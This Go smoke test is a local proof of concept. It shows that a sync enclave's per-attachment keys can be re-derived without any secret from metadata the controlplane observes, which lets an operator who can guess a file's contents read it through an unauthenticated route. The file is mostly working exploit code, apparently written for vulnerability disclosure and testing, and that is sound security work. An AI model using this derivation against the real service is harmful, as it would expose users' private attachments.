//go:build smoke

// PoC (local only): per-attachment keys minted by the sync enclave are a
// deterministic, secret-free function of (idempotency key, chat id,
// clerk user id, sha256(plaintext)). For the fork and import flows the
// idempotency key is itself derived from values the controlplane
// observes, so a controlplane operator who can guess an attachment's
// plaintext can recompute both the attachment id and the per-attachment
// key offline, and then fetch the plaintext through the unauthenticated
// /v1/attachment/get-public route without any user credential.
//
//	go test -tags=smoke -run TestPoC_ -v -count=1 ./internal/localstack/smoke
package smoke

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"testing"
	"time"

	"golang.org/x/crypto/hkdf"

	"github.com/tinfoilsh/confidential-sync-enclave/internal/controlplane"
	"github.com/tinfoilsh/confidential-sync-enclave/internal/localstack"
)

// ---- attacker-side re-implementation of the enclave's public derivation ----
// (mirrors internal/server/attachment_ops.go deriveAttachmentMaterials and
// encodeIKM, internal/server/fork_ops.go forkAttachmentIdemKey, and the
// webapp's cloud-storage.ts attachmentIdempotencyKey). No secret is involved.

func attackerEncodeIKM(parts ...string) []byte {
	var buf []byte
	var lenBuf [8]byte
	for _, p := range parts {
		binary.BigEndian.PutUint64(lenBuf[:], uint64(len(p)))
		buf = append(buf, lenBuf[:]...)
		buf = append(buf, p...)
	}
	return buf
}

func attackerDeriveAttachment(idempotencyKey, chatID, clerkSubject string, plaintext []byte) (id string, key []byte) {
	digest := sha256.Sum256(plaintext)
	ikm := attackerEncodeIKM(idempotencyKey, chatID, clerkSubject, hex.EncodeToString(digest[:]))
	idBytes := make([]byte, 18)
	_, _ = io.ReadFull(hkdf.New(sha256.New, ikm, nil, []byte("tinfoil-attachment-id-v1")), idBytes)
	key = make([]byte, 32)
	_, _ = io.ReadFull(hkdf.New(sha256.New, ikm, nil, []byte("tinfoil-attachment-key-v1")), key)
	return hex.EncodeToString(idBytes), key
}

// webappIdempotencyKey mirrors tinfoil-webapp src/services/cloud/cloud-storage.ts
// attachmentIdempotencyKey(chatId, clientAttachmentId, plaintext).
func webappIdempotencyKey(chatID, clientAttachmentID string, plaintext []byte) string {
	contentDigest := sha256.Sum256(plaintext)
	sum := sha256.Sum256([]byte("attachment:" + chatID + ":" + clientAttachmentID + ":" + base64.StdEncoding.EncodeToString(contentDigest[:])))
	return hex.EncodeToString(sum[:16])
}

// forkIdemKey mirrors internal/server/fork_ops.go forkAttachmentIdemKey.
func forkIdemKey(forkIdem, sourceAttachmentID string, index int) string {
	sum := sha256.Sum256([]byte(fmt.Sprintf("fork-att:%s:%s:%d", forkIdem, sourceAttachmentID, index)))
	return hex.EncodeToString(sum[:16])
}

// ---- controlplane-side observation ----------------------------------------

type cpObservation struct {
	Method string
	Path   string
	Header http.Header
	Body   []byte
}

type cpRecorder struct {
	mu  sync.Mutex
	obs []cpObservation
}

func (r *cpRecorder) observe(req *http.Request) {
	var body []byte
	if req.Body != nil {
		body, _ = io.ReadAll(req.Body)
		req.Body = io.NopCloser(bytes.NewReader(body))
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	r.obs = append(r.obs, cpObservation{Method: req.Method, Path: req.URL.RequestURI(), Header: req.Header.Clone(), Body: body})
}

func (r *cpRecorder) snapshot() []cpObservation {
	r.mu.Lock()
	defer r.mu.Unlock()
	return append([]cpObservation(nil), r.obs...)
}

// unauthenticatedGetPublic fetches an attachment through the public route
// with NO Authorization header and NO X-Sync-Protocol header.
func unauthenticatedGetPublic(t *testing.T, enclaveURL, id string, key []byte) (int, []byte) {
	t.Helper()
	body, _ := json.Marshal(map[string]string{"id": id, "att_key": base64.StdEncoding.EncodeToString(key)})
	resp, err := http.Post(enclaveURL+"/v1/attachment/get-public", "application/json", bytes.NewReader(body))
	if err != nil {
		t.Fatalf("get-public: %v", err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	if resp.StatusCode != 200 {
		return resp.StatusCode, raw
	}
	var out struct {
		Plaintext string `json:"plaintext"`
	}
	_ = json.Unmarshal(raw, &out)
	pt, _ := base64.StdEncoding.DecodeString(out.Plaintext)
	return resp.StatusCode, pt
}

func TestPoC_AttachmentKeyDerivableWithoutSecret(t *testing.T) {
	rec := &cpRecorder{}
	stack, err := localstack.Start(localstack.Config{CPObserver: rec.observe})
	if err != nil {
		t.Fatalf("start stack: %v", err)
	}
	t.Cleanup(stack.Stop)

	// Victim: a normal Tinfoil Chat user with a registered CEK.
	f := newFixtureOnStack(t, stack, "user_victim")

	// A plaintext the attacker can guess (any known file: a public PDF, a
	// meme, a document the attacker previously sent the victim, ...).
	plaintext := []byte("PNG-ish bytes of a file the attacker already knows")
	chatID := "chat-victim-1"
	clientAttachmentID := "6d1a4f0b-7f3e-4c23-9d19-2b1c7c5e9a11" // webapp: crypto.randomUUID()

	// 1. Victim uploads the attachment exactly like the webapp does.
	idem := webappIdempotencyKey(chatID, clientAttachmentID, plaintext)
	status, body := f.post("/v1/attachment/put", map[string]any{
		"chat_id":         chatID,
		"plaintext":       base64.StdEncoding.EncodeToString(plaintext),
		"idempotency_key": idem,
	})
	if status != 200 {
		t.Fatalf("attachment/put: %d %s", status, body)
	}
	var put struct {
		ID     string `json:"id"`
		AttKey string `json:"att_key"`
	}
	_ = json.Unmarshal(body, &put)
	t.Logf("enclave minted attachment id=%s att_key=%s", put.ID, put.AttKey)

	// 2. Victim pushes the chat JSON that references the attachment.
	chatJSON, _ := json.Marshal(map[string]any{
		"id": chatID, "title": "secret chat", "createdAt": "2026-10-08T00:00:00.000Z", "isLocalOnly": false,
		"messages": []map[string]any{{
			"role": "user", "content": "here is the file", "timestamp": "2026-10-08T00:00:00.000Z",
			"attachments": []map[string]any{{
				"id": put.ID, "type": "image", "fileName": "known.png", "mimeType": "image/png",
				"encryptionKey": put.AttKey,
			}},
		}},
	})
	if st, resp := f.push("chat", chatID, chatJSON, nil, "push-idem-1"); st != 200 {
		t.Fatalf("push: %d %s", st, resp.Raw)
	}

	// --- Scenario A: anyone who knows (clerk sub, chat id, client attachment
	// uuid, plaintext) recomputes id + key with public code only. ---
	derivedID, derivedKey := attackerDeriveAttachment(idem, chatID, "user_victim", plaintext)
	if derivedID != put.ID {
		t.Fatalf("derived id %s != enclave id %s", derivedID, put.ID)
	}
	if base64.StdEncoding.EncodeToString(derivedKey) != put.AttKey {
		t.Fatalf("derived key mismatch")
	}
	st, got := unauthenticatedGetPublic(t, stack.EnclaveURL, derivedID, derivedKey)
	if st != 200 || !bytes.Equal(got, plaintext) {
		t.Fatalf("scenario A: get-public status=%d body=%q", st, got)
	}
	t.Logf("SCENARIO A: unauthenticated get-public with offline-derived (id,key) returned the plaintext: %q", got)

	// --- Scenario B: the victim forks the chat (webapp "branch" feature). The
	// controlplane sees the fork's idempotency key, the target chat id, the
	// clerk user id and the source attachment id; nothing else is needed. ---
	forkIdem := "a3c1e6f2b9d04e7f8a5b6c7d8e9f0a1b" // webapp newIdempotencyKey(), sent to CP as X-Idempotency-Key
	status, body = f.post("/v1/sync/fork", map[string]any{
		"source_id":       chatID,
		"target_id":       "chat-victim-fork",
		"key":             f.cekB64,
		"message_count":   1,
		"title":           "fork",
		"created_at":      "2026-10-08T00:00:00Z",
		"idempotency_key": forkIdem,
	})
	if status != 200 {
		t.Fatalf("fork: %d %s", status, body)
	}

	// What the controlplane operator observed (no decryption, no user keys):
	var cpForkIdem, cpTargetChat, cpSub, cpNewAttID, cpSrcAttID string
	for _, o := range rec.snapshot() {
		if o.Method == "POST" && strings.HasPrefix(o.Path, "/api/sync/attachment-index/") {
			aid := strings.TrimPrefix(o.Path, "/api/sync/attachment-index/")
			var b struct {
				ChatID string `json:"chat_id"`
			}
			_ = json.Unmarshal(o.Body, &b)
			if b.ChatID == chatID {
				cpSrcAttID = aid
			}
			if b.ChatID == "chat-victim-fork" {
				cpNewAttID = aid
			}
		}
		if o.Method == "PUT" && o.Path == "/api/sync/blob/chat/chat-victim-fork" {
			cpForkIdem = o.Header.Get(controlplane.HeaderIdempotency)
			cpTargetChat = "chat-victim-fork"
			cpSub = o.Header.Get(controlplane.HeaderClerkUserID)
		}
	}
	t.Logf("CP observed: fork X-Idempotency-Key=%s target chat=%s X-Clerk-User-Id=%s source att id=%s new att id=%s",
		cpForkIdem, cpTargetChat, cpSub, cpSrcAttID, cpNewAttID)
	if cpForkIdem == "" || cpSub == "" || cpSrcAttID == "" || cpNewAttID == "" {
		t.Fatalf("controlplane observation incomplete: %+v", rec.snapshot())
	}

	// Attacker (controlplane operator) derives the forked attachment's id and
	// key purely from observed metadata plus a guessed plaintext.
	bIdem := forkIdemKey(cpForkIdem, cpSrcAttID, 0)
	bID, bKey := attackerDeriveAttachment(bIdem, cpTargetChat, cpSub, plaintext)
	if bID != cpNewAttID {
		t.Fatalf("scenario B: derived id %s != CP-observed new attachment id %s", bID, cpNewAttID)
	}
	t.Logf("SCENARIO B: derived id %s == CP-visible attachment id (plaintext guess confirmed offline, no enclave call)", bID)
	st, got = unauthenticatedGetPublic(t, stack.EnclaveURL, bID, bKey)
	if st != 200 || !bytes.Equal(got, plaintext) {
		t.Fatalf("scenario B: get-public status=%d body=%q", st, got)
	}
	t.Logf("SCENARIO B: unauthenticated get-public with CP-derived key returned the plaintext: %q", got)

	// Negative control: a wrong plaintext guess yields a different id and a
	// key the sidecar rejects (400 DecryptionFailed -> enclave 400).
	wrongID, wrongKey := attackerDeriveAttachment(bIdem, cpTargetChat, cpSub, []byte("wrong guess"))
	if wrongID == cpNewAttID {
		t.Fatalf("wrong guess should not match")
	}
	st, _ = unauthenticatedGetPublic(t, stack.EnclaveURL, cpNewAttID, wrongKey)
	if st == 200 {
		t.Fatalf("negative control: wrong key must not decrypt")
	}
	t.Logf("negative control: wrong key -> status %d (as expected)", st)
	_ = time.Second
}

// newFixtureOnStack is newFixture() against an already-running stack so the
// PoC can keep its controlplane observer.
func newFixtureOnStack(t *testing.T, stack *localstack.Stack, sub string) *fixture {
	t.Helper()
	tok, err := stack.MintJWT(sub, time.Hour)
	if err != nil {
		t.Fatalf("mint jwt: %v", err)
	}
	cek := make([]byte, 32)
	copy(cek, []byte("victim-cek-fixed-for-poc-0123456"))
	kidBytes, err := deriveKID(cek)
	if err != nil {
		t.Fatalf("kid: %v", err)
	}
	f := &fixture{t: t, stack: stack, userSub: sub, jwt: tok, cek: cek, cekKID: kidBytes, cekB64: base64.StdEncoding.EncodeToString(cek)}
	if _, _, err := f.registerKey("init-idem", "start_fresh"); err != nil {
		t.Fatalf("register key: %v", err)
	}
	return f
}

func deriveKID(cek []byte) (string, error) {
	kid, err := cryptoDeriveKeyID(cek)
	if err != nil {
		return "", err
	}
	return kid, nil
}
